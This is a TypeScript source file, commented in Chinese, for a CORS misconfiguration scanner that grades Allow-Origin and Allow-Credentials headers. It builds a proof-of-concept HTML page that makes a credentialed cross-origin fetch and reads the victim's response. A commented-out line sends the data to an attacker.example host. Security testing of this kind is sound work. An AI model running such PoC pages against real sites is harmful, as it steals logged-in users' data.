/**
 * CORS 配置分析 —— 纯函数，渲染进程与 MCP 共用。
 *
 * 输入：请求携带的 Origin + 响应头里的 CORS 三件套
 *   - Access-Control-Allow-Origin
 *   - Access-Control-Allow-Credentials
 *   - Vary
 * 输出语言中立的结论 id + 证据。严格遵循「证据 → 可利用条件 → 影响」，
 * 不凭单一头字段直接定高危。
 */

export type CorsSeverity = 'critical' | 'high' | 'medium' | 'low' | 'info' | 'safe'

export interface CorsInput {
  /** 请求里的 Origin，如 https://evil.example，可为空 */
  origin: string
  /** 响应头多行文本，或已解析的 [name, value][] */
  headers: string
  /** 被测站点的可信源（可选），用于判断后缀匹配绕过 */
  trustedOrigin?: string
}

export interface CorsFinding {
  id: string
  severity: CorsSeverity
  /** 关键证据值（ACAO / ACAC 的实际值） */
  evidence: string
  /** 界面需要补充的数值（如反射回来的 Origin） */
  detail?: string
}

export interface CorsResult {
  findings: CorsFinding[]
  /** 可直接复制的 PoC 页面（判定存在跨域读取风险时生成） */
  poc: string | null
  /** 请求是否被允许携带凭据 */
  credentials: boolean
  acao: string
}

interface ParsedCorsHeaders {
  acao: string
  acac: boolean
  varyHasOrigin: boolean
}

export function parseHeaderBlock(raw: string): [string, string][] {
  const out: [string, string][] = []
  for (const line of raw.split(/\r?\n/)) {
    const idx = line.indexOf(':')
    if (idx <= 0) continue
    const name = line.slice(0, idx).trim()
    const value = line.slice(idx + 1).trim()
    if (name) out.push([name, value])
  }
  return out
}

function pickHeaders(headers: string): ParsedCorsHeaders {
  const map = new Map<string, string>()
  for (const [k, v] of parseHeaderBlock(headers)) map.set(k.toLowerCase(), v)
  return {
    acao: map.get('access-control-allow-origin') ?? '',
    acac: /^true$/i.test(map.get('access-control-allow-credentials') ?? ''),
    varyHasOrigin: /(^|,)\s*origin\s*(,|$)/i.test(map.get('vary') ?? ''),
  }
}

function originHost(origin: string): string {
  try {
    return new URL(origin).host
  } catch {
    return origin.replace(/^https?:\/\//, '')
  }
}

/** 构造 PoC：默认用请求里的 Origin 作为攻击者页面来源 */
export function buildCorsPoc(targetUrl: string, withCredentials: boolean, origin: string): string {
  return `<!doctype html>
<!-- PoC：保存为 html，需要受害者浏览器对目标仍有有效会话 -->
<html>
<body>
<script>
// 攻击者页面实际来源：${origin || 'https://attacker.example'}
fetch(${JSON.stringify(targetUrl)}, {
  credentials: ${withCredentials ? "'include'" : "'omit'"},
})
  .then((r) => r.text())
  .then((data) => {
    // 能读到响应体即说明跨域读取成立；实战可回传 data
    console.log('leaked:', data)
    // navigator.sendBeacon('https://attacker.example/log', data)
  })
</script>
</body>
</html>`
}

export function analyzeCors(input: CorsInput): CorsResult {
  const { acao, acac, varyHasOrigin } = pickHeaders(input.headers)
  const origin = input.origin.trim()
  const findings: CorsFinding[] = []

  if (!acao) {
    findings.push({ id: 'acao.absent', severity: 'info', evidence: '' })
    return { findings, poc: null, credentials: acac, acao }
  }

  // 1) 通配符
  if (acao === '*') {
    if (acac) {
      // 规范禁止 * + credentials，浏览器会拦截，属于「想配错但浏览器兜底」
      findings.push({
        id: 'wildcard.credentials.browserBlocked',
        severity: 'medium',
        evidence: acao,
      })
    } else {
      findings.push({ id: 'wildcard.readonly', severity: 'low', evidence: acao })
    }
    return { findings, poc: null, credentials: acac, acao }
  }

  // 2) null
  if (acao === 'null') {
    findings.push({
      id: acac ? 'null.credentials' : 'null.anon',
      severity: acac ? 'high' : 'medium',
      evidence: 'null',
    })
  }

  // 3) 反射请求 Origin
  const reflects = origin && acao.replace(/\/$/, '') === origin.replace(/\/$/, '')
  if (reflects) {
    findings.push({
      id: acac ? 'reflect.credentials' : 'reflect.anon',
      severity: acac ? 'critical' : 'high',
      evidence: acao,
      detail: origin,
    })
    if (!varyHasOrigin) findings.push({ id: 'vary.origin.missing', severity: 'low', evidence: '' })
  }

  // 4) 后缀匹配绕过：ACAO 是固定可信源，检查它是否可能被 endsWith 类规则绕过
  //    （这里是静态提示：真正的判定依据是服务端校验逻辑，本地只能提示形态）
  if (!reflects && input.trustedOrigin) {
    const host = originHost(acao)
    if (origin && host && !acao.includes(origin)) {
      // 给出攻击者可注册的形态示例
      findings.push({
        id: 'suffix.hint',
        severity: 'info',
        evidence: host,
        detail: `attacker-${host}`,
      })
    }
  }

  // 5) 静态白名单单个源
  if (!reflects && acao !== 'null') {
    findings.push({ id: 'static.origin', severity: 'info', evidence: acao })
  }

  // 6) ACAC 存在但 Origin 未反射
  if (acac && !reflects && acao !== 'null') {
    findings.push({ id: 'credentials.static', severity: 'info', evidence: 'true' })
  }

  const exploitable = findings.some((f) => f.severity === 'critical' || f.severity === 'high')
  const poc =
    exploitable && origin ? buildCorsPoc('https://TARGET/account/api', acac, origin) : null

  return { findings, poc, credentials: acac, acao }
}
